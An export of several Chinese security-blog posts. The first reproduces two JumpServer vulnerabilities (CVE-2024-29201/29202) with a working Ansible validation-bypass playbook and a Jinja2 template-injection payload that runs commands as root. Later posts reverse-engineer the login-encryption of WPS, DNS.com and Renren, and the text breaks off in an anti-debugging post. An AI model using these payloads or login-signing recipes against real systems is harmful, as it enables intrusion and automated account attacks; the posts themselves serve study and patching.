    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>JumpServer 是一款开源堡垒主机和运维安全审计系统。攻击者可以绕过 JumpServer 的 Ansible 中的输入验证机制(CVE-2024-29201)或者利用 JumpServer 的 Ansible 中的 Jinja2 模板注入漏洞(CVE-2024-29202)，在 Celery 容器中执行任意代码。由于 Celery 容器以 root 权限运行并具有数据库访问权限，因此攻击者可以从所有主机窃取敏感信息或操纵数据库。<br>影响版本：<br>v3.0.0 &lt;&#x3D; JumpServer &lt;&#x3D; v3.10.6<br>CVSS3 评分为 9.9。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网下载安装脚本<a href="https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh">quick_start.sh</a>，并且修改 VERSION 为存在漏洞的版本，例如 3.10.6:<br><img src="/2023/04/27/file-upload/01/image-20240402154549181.png"><br>下面执行脚本进行安装：<br><img src="/2023/04/27/file-upload/01/image-20240402154818142.png"><br>安装完成后访问 web 页面，默认密码为 admin&#x2F;admin:<br>首先在用户管理处新建一个普通权限的用户，用作攻击者账户，即为下图中的 test：<br><img src="/2023/04/27/file-upload/01/image-20240402154958699.png"><br>下面在资产列表处，新建一个资产：<br><img src="/2023/04/27/file-upload/01/image-20240402155105226.png"><br>新建完成后，通过更新，添加一个账号：<br><img src="/2023/04/27/file-upload/01/image-20240402155215982.png"></p><p>测试一下是否配置成功：<br><img src="/2023/04/27/file-upload/01/image-20240402155307915.png"><br>如图所示即可。<br>最后授权一个资产给攻击者账户：<br><img src="/2023/04/27/file-upload/01/image-20240402155537696.png"><br>到此所有配置全部完成。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CVE-2024-29201"><a href="#CVE-2024-29201" class="headerlink" title="CVE-2024-29201"></a>CVE-2024-29201</h4><p>切换到攻击者账户，到模板管理中，创建一个 playbook，test_playbook:<br><img src="/2023/04/27/file-upload/01/image-20240402155849736.png"><br>内容如下：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[&#123;<br>     <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;RCE playbook&quot;</span>,<br>     <span class="hljs-string">&quot;hosts&quot;</span>: <span class="hljs-string">&quot;all&quot;</span>,<br>     <span class="hljs-string">&quot;tasks&quot;</span>: [<br>       &#123;<br>         <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;this runs in Celery container&quot;</span>,<br>         <span class="hljs-string">&quot;shell&quot;</span>: <span class="hljs-string">&quot;id &gt; /tmp/testfile&quot;</span>,<br>         <span class="hljs-string">&quot;\u0064elegate_to&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span><br>&#125; ],<br>     <span class="hljs-string">&quot;vars&quot;</span>: &#123;<br>     <span class="hljs-string">&quot;ansible_\u0063onnection&quot;</span>: <span class="hljs-string">&quot;local&quot;</span><br>     &#125;<br>&#125;]<br></code></pre></td></tr></table></figure><p>保存后，新建一个作业，其中选择前面新建的 playbook，运行即可。<br><img src="/2023/04/27/file-upload/01/image-20240402160005074.png"><br><img src="/2023/04/27/file-upload/01/image-20240402160417952.png"><br>执行的命令为 <code>id &gt; /tmp/testfile</code>，到 container 中查看：<br><img src="/2023/04/27/file-upload/01/image-20240402160141565.png"><br>成功执行命令。<br>如果将 unicode 编码部分写成明文，结果如下：<br><img src="/2023/04/27/file-upload/01/image-20240402161720773.png"><br>失败。<br>攻击流量如下：<br><img src="/2023/04/27/file-upload/01/image-20240402161248350.png"></p><h4 id="CVE-2024-29202"><a href="#CVE-2024-29202" class="headerlink" title="CVE-2024-29202"></a>CVE-2024-29202</h4><p>与前面过程相似，修改 playbook 的内容如下：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- name: |</span><br><span class="language-xml">       &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="language-xml">         &#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="language-xml">           </span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">             <span class="hljs-name">x</span>()._module.__builtins__[&quot;__import__&quot;](<span class="hljs-name">&quot;os&quot;</span>).system(<span class="hljs-name">&quot;whoami &gt; /tmp/testfile2&quot;</span>)</span><br><span class="hljs-template-variable">           &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">         &#123;%endif%&#125;</span><br><span class="language-xml">       &#123;%endfor%&#125;</span><br></code></pre></td></tr></table></figure><p>运行会提示 error，但是能成功执行：<br><img src="/2023/04/27/file-upload/01/image-20240402160348586.png"><br><img src="/2023/04/27/file-upload/01/image-20240402160330683.png"><br>成功。<br>攻击流量如下：<br><img src="/2023/04/27/file-upload/01/image-20240402161413355.png"></p><h2 id="规避措施"><a href="#规避措施" class="headerlink" title="规避措施"></a>规避措施</h2><p>1、升级 jumpserver 到 3.10.7 或更高版本<br>2、在「功能设置」中关闭「任务中心」功能</p><p>参考链接：</p><ul><li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj</a></li><li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch</a></li><li><a href="https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/">https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>CVE-2024-29201</tag>
      
      <tag>CVE-2024-29202</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js逆向系列09-WPS</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9709-WPS/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9709-WPS/</url>
    
    <content type="html"><![CDATA[<h1 id="js逆向系列09-WPS"><a href="#js逆向系列09-WPS" class="headerlink" title="js逆向系列09-WPS"></a>js逆向系列09-WPS</h1><p><img src="/2023/04/27/file-upload/024-06-06_13-38-19.png" alt="PixPin_2024-06-06_13-38-19"></p><p>直接输入随机账号密码，查看网络请求，主要有两个数据包：</p><p><img src="/2023/04/27/file-upload/240606134047447.png" alt="image-20240606134047447">请求passkey接口，返回pass_key和ssid。</p><p><img src="/2023/04/27/file-upload/240606134138357.png" alt="image-20240606134138357"></p><p>还有一个safe_verify请求，请求体中包含ssid，password，account等参数，其中ssid与第一个请求中返回的ssid一致，这里主要关注password的加密方式。</p><p>关键的请求包为XHR的形式：</p><p><img src="/2023/04/27/file-upload/240606134607378.png" alt="image-20240606134607378"></p><p>首先还是下一个XHR断点：</p><p><img src="/2023/04/27/file-upload/240606134648541.png" alt="image-20240606134648541"></p><p>刷新，重新登录，从栈顶依次往下看：</p><p><img src="/2023/04/27/file-upload/240606135112527.png" alt="image-20240606135112527"></p><p>先看到send，可以看到e.data里已经包含了加密之后的各参数，继续往前：</p><p><img src="/2023/04/27/file-upload/240606135235857.png" alt="image-20240606135235857"></p><p>同样，b.data中的数据已经是加密之后的。</p><p>直到第三个匿名函数，已经无法跟到与password相关的值，下断点：</p><p><img src="/2023/04/27/file-upload/240606142241122.png" alt="image-20240606142241122"></p><p>刷新后发现，直接会在验证码加载时就断住，暂时放XHR跟栈，下面通过搜索password来找加密的部分。</p><p>共有9处结果：</p><p><img src="/2023/04/27/file-upload/240606142555327.png" alt="image-20240606142555327"></p><p>很容易定位到common.19c277c4.js中的<code>a.password = c.encrypt(b),</code>行.</p><p>下断：</p><p><img src="/2023/04/27/file-upload/240606142844770.png" alt="image-20240606142844770"></p><p>右侧能够看到，a中的各参数值即为请求体中的内容，而<code>a.password=c.encrypt(b)</code>，b的值为明文密码，即123456.</p><p>代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ok&quot;</span> == a.<span class="hljs-property">result</span>) &#123;<br>                    <span class="hljs-keyword">var</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSEncrypt</span>;<br>                    c.<span class="hljs-title function_">setPublicKey</span>(a.<span class="hljs-property">pass_key</span>),<br>                    a.<span class="hljs-property">password</span> = c.<span class="hljs-title function_">encrypt</span>(b),<br>                    <span class="hljs-string">&quot;undefined&quot;</span> != <span class="hljs-keyword">typeof</span> $ &amp;&amp; $(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">trigger</span>(<span class="hljs-string">&quot;encryptPassword&quot;</span>, a)<br>                &#125;<br>            &#125;,<br></code></pre></td></tr></table></figure><p>跟进encrypt：</p><p><img src="/2023/04/27/file-upload/240606143145116.png" alt="image-20240606143145116"></p><p>继续下断点，步入：</p><p><img src="/2023/04/27/file-upload/240606143413532.png" alt="image-20240606143413532"></p><p>选中的部分即为加密代码，这两处均在jsencrypt.js中。</p><p>直接将整个js文件复制，本地尝试运行：</p><p><img src="/2023/04/27/file-upload/240606143914004.png" alt="image-20240606143914004"></p><p>navigator is not defined。</p><p>直接在文件开头加上<code>var navigator = &#123;&#125;;</code>，运行继续报错window is not defined，加上<code>var window = &#123;&#125;;</code></p><p>至此能够成功运行：</p><p><img src="/2023/04/27/file-upload/240606144201468.png" alt="image-20240606144201468"></p><p>再把前面的加密代码补上：</p><p><img src="/2023/04/27/file-upload/240606144530411.png" alt="image-20240606144530411"></p><p>JSEncrypt is not defined，而原来的js中将db赋值给window.JSEncrypt，修改js代码并删除无关部分：</p><p><img src="/2023/04/27/file-upload/240606150322579.png" alt="image-20240606150322579"></p><p>得到加密的password，但是每次运行的结果都不同。</p><p>先加几个console.log看看哪里会变化：</p><p><img src="/2023/04/27/file-upload/240606152415326.png" alt="image-20240606152415326"></p><p>问题在b中，每次运行都会返回一个看起来随机的值。在function(a,b)的最后一行,new J(c)，打个断点跟进去查看J函数：</p><p><img src="/2023/04/27/file-upload/240606152618200.png" alt="image-20240606152618200"></p><p>里面有近1000行代码，进行了各类运算，其中看到下面一行：</p><p><img src="/2023/04/27/file-upload/240606152700887.png" alt="image-20240606152700887"></p><p><code>f.fromInt(H[Math.floor(Math.random() * H.length)]);</code>，存在Math.random()，每次都会获取一个随机值，因此每次加密的结果都是不同的。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js逆向系列08-DNS.com</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9708-DNS.com/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9708-DNS.com/</url>
    
    <content type="html"><![CDATA[<h1 id="js逆向系列08-DNS-com"><a href="#js逆向系列08-DNS-com" class="headerlink" title="js逆向系列08-DNS.com"></a>js逆向系列08-DNS.com</h1><p><img src="/2023/04/27/file-upload/240516140103736.png" alt="image-20240516140103736"></p><p>首先输入随机账号，密码为123456，进行尝试：</p><p><img src="/2023/04/27/file-upload/240516140205846.png" alt="image-20240516140205846"></p><p>共有5个参数，email_or_phone，password，type，redirectTo，_token。除了redirectTo，其余均为加密。</p><p>首先看password参数。</p><p>直接搜索字符串：</p><p><img src="/2023/04/27/file-upload/240516140557486.png" alt="image-20240516140557486"></p><p>共有34个匹配结果。</p><p>下个XHR断点看看。</p><p><img src="/2023/04/27/file-upload/240516140713045.png" alt="image-20240516140713045"></p><p>看一下调用栈：</p><p><img src="/2023/04/27/file-upload/240516140927487.png" alt="image-20240516140927487"></p><p>可以看到在dispatch时，并没有password参数的信息，但是能看到此时的type为明文字符串submit。</p><p>查看下一个调用栈，到匿名这里，obj里包含了登录请求中的所有参数：</p><p><img src="/2023/04/27/file-upload/240516141022191.png" alt="image-20240516141022191"></p><p>接下来就重点关注login.html中的obj。</p><p>直接搜索obj，依次往上找：</p><p><img src="/2023/04/27/file-upload/240516144558438.png" alt="image-20240516144558438"></p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<br>                <span class="hljs-string">&#x27;email_or_phone&#x27;</span>: <span class="hljs-title function_">aes</span>($(<span class="hljs-string">&quot;.formAccount .email_or_phone&quot;</span>).<span class="hljs-title function_">val</span>()),<br>                <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-title function_">aes</span>($(<span class="hljs-string">&quot;.formAccount .password&quot;</span>).<span class="hljs-title function_">val</span>()),<br>                <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-title function_">aes</span>(<span class="hljs-string">&#x27;account&#x27;</span>),<br>                <span class="hljs-string">&#x27;redirectTo&#x27;</span>: <span class="hljs-string">&#x27;https://www.dns.com/dashboard&#x27;</span>,<br>                <span class="hljs-string">&#x27;_token&#x27;</span>: _token<br>            &#125;<br></code></pre></td></tr></table></figure><p>首先是通过$(…)选择器选中表单元素，再通过aes进行加密，加密的关键点应该就在aes()中。</p><p>通过console.log()确认一下传入的参数是不是输入的明文值：</p><p><img src="/2023/04/27/file-upload/240516145715349.png" alt="image-20240516145715349"></p><p>一致。</p><p>其实这里在通过XHR定位到大概的位置之后，直接搜索password也能很快找到：</p><p><img src="/2023/04/27/file-upload/240516145837980.png" alt="image-20240516145837980"></p><p>或者搜索123456等可能的密钥：</p><p><img src="/2023/04/27/file-upload/240516145922177.png" alt="image-20240516145922177"></p><p>只有两个结果，并且直接跟到了aes函数内部。</p><p>将js代码改为python实现，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad_zero_padding</span>(<span class="hljs-params">data, block_size</span>):<br>    padding_len = block_size - (<span class="hljs-built_in">len</span>(data) % block_size)<br>    <span class="hljs-keyword">return</span> data + (<span class="hljs-string">b&#x27;\0&#x27;</span> * padding_len)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes</span>(<span class="hljs-params">val</span>):<br>    key = <span class="hljs-string">b&#x27;1234567890abcDEF&#x27;</span><br>    iv = <span class="hljs-string">b&#x27;1234567890abcDEF&#x27;</span><br>    <br>    <span class="hljs-comment"># Create AES cipher with CBC mode</span><br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <br>    <span class="hljs-comment"># Pad the input value with zero padding</span><br>    padded_val = pad_zero_padding(val.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)<br>    <br>    <span class="hljs-comment"># Encrypt the padded value</span><br>    encrypted_bytes = cipher.encrypt(padded_val)<br>    <br>    <span class="hljs-comment"># Encode the encrypted bytes to base64 to get a string representation</span><br>    enc = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-built_in">print</span>(val,enc)<br><br>aes(<span class="hljs-string">&quot;13888888888&quot;</span>)<br>aes(<span class="hljs-string">&quot;123456&quot;</span>)<br>aes(<span class="hljs-string">&quot;account&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要注意，JavaScript代码使用的是ZeroPadding，而Python代码使用的是iso7816填充，因此需要在python中也利用zeropadding的方式进行加密。</p><p><img src="/2023/04/27/file-upload/240516151421731.png" alt="image-20240516151421731"></p><p>加密结果与请求中的payload一致。</p><p>最后还剩下_token，直接全局搜索，发现在login.html中是写死的：</p><p><img src="/2023/04/27/file-upload/240516151538134.png" alt="image-20240516151538134"></p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js逆向系列07-人人网实战</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9707-%E4%BA%BA%E4%BA%BA%E7%BD%91%E5%AE%9E%E6%88%98/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9707-%E4%BA%BA%E4%BA%BA%E7%BD%91%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="js逆向系列07-人人网实战"><a href="#js逆向系列07-人人网实战" class="headerlink" title="js逆向系列07-人人网实战"></a>js逆向系列07-人人网实战</h1><p>首先打开登陆页：</p><p><img src="/2023/04/27/file-upload/240226135626826.png" alt="image-20240226135626826"></p><p>输入138888888888和123456之后，查看network，可以看到登录时的请求payload内容。</p><p>主要有appKey，callId，password，sessionKey，sig和user这几个参数，下面分别看看这些参数。</p><h2 id="appKey"><a href="#appKey" class="headerlink" title="appKey"></a>appKey</h2><p>直接全局搜索：</p><p><img src="/2023/04/27/file-upload/240226135833563.png" alt="image-20240226135833563"></p><p>可以看到appKey的值是写死的，跳过。</p><h2 id="callId"><a href="#callId" class="headerlink" title="callId"></a>callId</h2><p>这里的callId值为1708926871886，跟时间戳的格式很像，尝试用时间戳解析一下：</p><p><img src="/2023/04/27/file-upload/240226140034200.png" alt="image-20240226140034200"></p><p>正确。</p><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>前面输入的密码为123456，而密文是e10adc3949ba59abbe56e057f20f883e，很明显是md5加密，搜索1732584193来验证一下：</p><p><img src="/2023/04/27/file-upload/240226140222842.png" alt="image-20240226140222842"></p><p>猜想正确。</p><h2 id="sessionKey"><a href="#sessionKey" class="headerlink" title="sessionKey"></a>sessionKey</h2><p>sessionKey参数值为空，同样跳过。</p><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>该值即为登录时输入的用户名信息，并且为明文。</p><h2 id="sig"><a href="#sig" class="headerlink" title="sig"></a>sig</h2><p>最后来看sig参数，当前登录中，sig的值为5c4eaf63da0a3de5f8d8c5df30e1b3af。尝试解密，解密失败，下面从js入手。</p><p>先下个XHR断点，看一下调用栈：</p><p><img src="/2023/04/27/file-upload/240226140630571.png" alt="image-20240226140630571"></p><p>这里有一个loginByPass，从命名来看应该是通过password进行登录，跟进去：</p><p><img src="/2023/04/27/file-upload/240226140812814.png" alt="image-20240226140812814">先留意这个文件：new-renren……</p><p>全局搜索sig：</p><p><img src="/2023/04/27/file-upload/240226140745685.png" alt="image-20240226140745685"></p><p>共有3个文件，重点来看new-renren这个js。一共有70处调用，搜索.sig:</p><p><img src="/2023/04/27/file-upload/240226140950739.png" alt="image-20240226140950739"></p><p>还是有数十处，搜索sig&#x3D;:</p><p><img src="/2023/04/27/file-upload/240226141116590.png" alt="image-20240226141116590"></p><p>一共只有两处，依次查看一下：</p><p><img src="/2023/04/27/file-upload/240226141206504.png" alt="image-20240226141206504"></p><p>很明显都是从 ze.getSign(a, r.secretKey)取的值。</p><p>搜索getSign方法：</p><p><img src="/2023/04/27/file-upload/240226141249927.png" alt="image-20240226141249927"></p><p>函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">getSign</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">t, e</span>) &#123;<br>                <span class="hljs-keyword">var</span> i = <span class="hljs-string">&quot;c5957b350d87c02409766be680f76d5b&quot;</span>;<br>                e &amp;&amp; (i = e);<br>                <span class="hljs-keyword">var</span> s = <span class="hljs-title class_">Le</span>(t) + i<br>                  , n = <span class="hljs-title class_">Re</span>()(s);<br>                <span class="hljs-keyword">return</span> n<br>            &#125;<br></code></pre></td></tr></table></figure><p>打个断点看看：</p><p><img src="/2023/04/27/file-upload/240226172937107.png" alt="image-20240226172937107"></p><p>t即为传入的参数，而e就是前面提到写死的appKey，与前面的a&#x3D;s.params也能对应上。</p><p>先看Le(t)，打断点进去看：</p><p><img src="/2023/04/27/file-upload/240226161228581.png" alt="image-20240226161228581"></p><p>首先对参数的name进行了排序，排序之后键值对进行拼接。</p><p>结合上面的代码，此时s已经可以算出来，即为参数的key&#x3D;value再拼接上appKey：”bcceb522717c2c49f895b561fa913d10”</p><p>最后一个问题就是<code>n=Re()(s)</code>.</p><p>同样先打断点，步入：</p><p><img src="/2023/04/27/file-upload/240226164118643.png" alt="image-20240226164118643"></p><p>跟到t：f(e,n)，继续跟：</p><p><img src="/2023/04/27/file-upload/240226173033293.png" alt="image-20240226173033293"></p><p>看到e.exports &#x3D; function(e,n){}，由于前面只给了一个参数(Re()(s))，因此n为undefined，如图所示，但是e有值，因此跳到var r&#x3D;xxx，最后再通过一个三元运算，将结果return。</p><p>由于n为undefined，所以最终return的结果为t.bytesToHex(r)，而r&#x3D;t.wordsToBytes(a(e,n))，最终取值其实就是t.bytesToHex(t.wordsToBytes(a(e,n))).</p><p>写一段简单的js代码，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bbb = <span class="hljs-keyword">function</span>(<span class="hljs-params">callId,password,user</span>)&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;appKey=bcceb522717c2c49f895b561fa913d10callId=&quot;</span>+callId+<span class="hljs-string">&quot;password=&quot;</span>+password+<span class="hljs-string">&quot;sessionKey=user=&quot;</span>+user+<span class="hljs-string">&quot;bcceb522717c2c49f895b561fa913d10&quot;</span>;<br>    <span class="hljs-keyword">var</span> sig = t.<span class="hljs-title function_">bytesToHex</span>(t.<span class="hljs-title function_">wordsToBytes</span>(<span class="hljs-title function_">a</span>(s,n)));<br>    <span class="hljs-keyword">return</span> sig<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">bbb</span>(<span class="hljs-string">&quot;1708926871886&quot;</span>,<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>,<span class="hljs-string">&quot;13888888888&quot;</span>))<br></code></pre></td></tr></table></figure><p>这里使用的时间戳和user，pass为文中第一次请求时的数据，运行结果为：</p><p><img src="/2023/04/27/file-upload/240226173555241.png" alt="image-20240226173555241"></p><p>一致。</p><p>至此整个逻辑已经清楚了，后续要做的就是抠代码使其能够在本地运行。</p><p><img src="/2023/04/27/file-upload/240226181348691.png" alt="image-20240226181348691"></p><p>注意到，在核心加密函数中，存在1732584193，即md5的默认的模值，将s整个进行md5加密，其实就能得到sig的值。</p><p>修改代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bbb = <span class="hljs-keyword">function</span>(<span class="hljs-params">callId,password,user</span>)&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;appKey=bcceb522717c2c49f895b561fa913d10callId=&quot;</span>+callId+<span class="hljs-string">&quot;password=&quot;</span>+password+<span class="hljs-string">&quot;sessionKey=user=&quot;</span>+user+<span class="hljs-string">&quot;bcceb522717c2c49f895b561fa913d10&quot;</span>;<br>    <span class="hljs-keyword">var</span> sig = <span class="hljs-title function_">md5</span>(s);<br>    <span class="hljs-keyword">return</span> sig<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">bbb</span>(<span class="hljs-string">&quot;1708926871886&quot;</span>,<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>,<span class="hljs-string">&quot;13888888888&quot;</span>))<br></code></pre></td></tr></table></figure><p>也可以通过抠代码的方式一步步进行，这里不再介绍。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列06-反调试</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9706-%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9706-%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="js-逆向系列06-反调试"><a href="#js-逆向系列06-反调试" class="headerlink" title="js 逆向系列06-反调试"></a>js 逆向系列06-反调试</h1><h2 id="反调试方法的分类"><a href="#反调试方法的分类" class="headerlink" title="反调试方法的分类"></a>反调试方法的分类</h2><h3 id="显性"><a href="#显性" class="headerlink" title="显性"></a>显性</h3><p>显性的反调试方法一般有：</p><ul><li>debugger</li><li>死循环<br>debugger 比较好理解，而死循环的方式有很多，例如通过循环语句、无限递归、两个方法互相调用、计时器（setInterval）、打开新页面（window.open(“xxx”)）、写历史记录、操作 url 地址等等等等。</li></ul><h3 id="隐性-（暗桩）"><a href="#隐性-（暗桩）" class="headerlink" title="隐性 （暗桩）"></a>隐性 （暗桩）</h3><p>发现在被调试之后给出错误逻辑</p><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="键盘监听-F12"><a href="#键盘监听-F12" class="headerlink" title="键盘监听 F12"></a>键盘监听 F12</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">keyCode</span> == <span class="hljs-number">123</span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;禁止调试！&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>用浏览器打开，当按下 F12 时会弹窗：<br><img src="/2023/04/27/file-upload/240223150054647.png"></p><h3 id="window-innerheight-内高和外高的差值"><a href="#window-innerheight-内高和外高的差值" class="headerlink" title="window .innerheight 内高和外高的差值"></a>window .innerheight 内高和外高的差值</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> heightDiff = <span class="hljs-built_in">window</span>.outerHeight - <span class="hljs-built_in">window</span>.innerHeight;<br><span class="hljs-keyword">if</span> (heightDiff &gt; <span class="hljs-number">200</span>) &#123;<br>  alert(<span class="hljs-string">&#x27;禁止调试！&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>打开 debug 页面后刷新，重新加载后检测到高度差过大，弹窗：<br><img src="/2023/04/27/file-upload/240223151052766.png"></p><h3 id="检测-console-log-调用的次数"><a href="#检测-console-log-调用的次数" class="headerlink" title="检测 console.log 调用的次数"></a>检测 console.log 调用的次数</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 